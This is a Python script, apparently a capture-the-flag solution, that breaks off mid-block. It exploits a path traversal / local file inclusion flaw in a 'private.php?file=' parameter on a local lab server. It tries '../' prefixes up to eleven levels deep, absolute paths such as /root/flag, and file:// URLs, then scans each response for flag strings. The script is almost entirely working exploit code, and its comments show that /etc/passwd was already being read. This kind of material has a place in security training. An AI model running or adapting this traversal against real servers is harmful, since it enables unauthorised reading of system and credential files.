import requests
import re

TARGET = "http://127.0.0.1:33001"
base_url = f"{TARGET}/private.php"

print("="*80)
print("FILE ENUMERATION - SEARCHING FOR FLAGS")
print("="*80)

baseline = requests.get(base_url, timeout=10)

# Try to find files in common locations
print("\n[+] Enumerating flag locations...\n")

flag_list = []

# Try multiple depths
for depth in range(1, 12):
    prefix = "../" * depth
    
    paths_to_try = [
        f"{prefix}flag",
        f"{prefix}flag.txt",
        f"{prefix}flag.php",
        f"{prefix}flag.html",
        f"{prefix}.flag",
        f"{prefix}FLAG",
        f"{prefix}FLAG.txt",
    ]
    
    for fpath in paths_to_try:
        url = f"{base_url}?file={fpath}"
        
        try:
            resp = requests.get(url, timeout=5)
            content_diff = len(resp.text) - len(baseline.text)
            
            # Clean output
            text_no_html = re.sub(r'<[^>]+>', ' ', resp.text)
            text_no_html = re.sub(r'\s+', ' ', text_no_html).strip()
            
            # Check for flags
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            if flags:
                print(f"[!] FLAG FOUND!!!")
                print(f"    Path: {fpath}")
                print(f"    Flags: {flags}")
                flag_list.extend(flags)
            
            # Check for file content (not error message)
            if content_diff > 50 and "File not exists or is not readable" not in resp.text:
                content_match = re.search(r'Content of\s+\S+\s+(.*)', text_no_html, re.DOTALL)
                if content_match:
                    content = content_match.group(1).strip()
                    # If it's not the etc/passwd content and has content
                    if "root:" not in content and len(content) > 20:
                        print(f"\n[+] Interesting file at {fpath}")
                        print(f"    Size: {len(content)} chars")
                        print(f"    Content: {content[:300]}")
                        
        except Exception as e:
            pass

# Try absolute paths
print("\n[+] Testing absolute paths...\n")

absolute_paths = [
    "/flag",
    "/flag.txt", 
    "/flag.php",
    "/FLAG",
    "/FLAG.txt",
    "/root/flag",
    "/root/flag.txt",
    "/home/flag",
    "/home/flag.txt",
    "/var/flag",
    "/var/flag.txt",
    "/var/www/flag",
    "/var/www/flag.txt",
    "/var/www/html/flag",
    "/var/www/html/flag.txt",
    "/app/flag",
    "/app/flag.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/opt/flag",
    "/opt/flag.txt",
]

for fpath in absolute_paths:
    url = f"{base_url}?file={fpath}"
    
    try:
        resp = requests.get(url, timeout=5)
        content_diff = len(resp.text) - len(baseline.text)
        
        text_no_html = re.sub(r'<[^>]+>', ' ', resp.text)
        text_no_html = re.sub(r'\s+', ' ', text_no_html).strip()
        
        # Check for flag pattern
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"[!] FLAG FOUND via absolute path!")
            print(f"    Path: {fpath}")
            print(f"    Flags: {flags}")
            flag_list.extend(flags)
        
        # Check for readable content
        if content_diff > 50 and "not exists" not in text_no_html.lower():
            content_match = re.search(r'Content of\s+\S+\s+(.*)', text_no_html, re.DOTALL)
            if content_match:
                content = content_match.group(1).strip()
                if "root:" not in content and len(content) > 10:
                    print(f"[+] File accessible: {fpath}")
                    print(f"    Content: {content[:200]}")
                    
    except Exception as e:
        pass

# Try with file:// protocol
print("\n[+] Testing file:// protocol...\n")

for fpath in ["/flag", "/flag.txt", "/root/flag", "/root/flag.txt"]:
    url = f"{base_url}?file=file://{fpath}"
    
    try:
        resp = requests.get(url, timeout=5)
        
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        if flags:
            print(f"[!] FLAG FOUND via file://!")
            print(f"    Path: {fpath}")
            print(f"    Flags: {flags}")
            flag_list.extend(flags)
            
    except Exception as e:
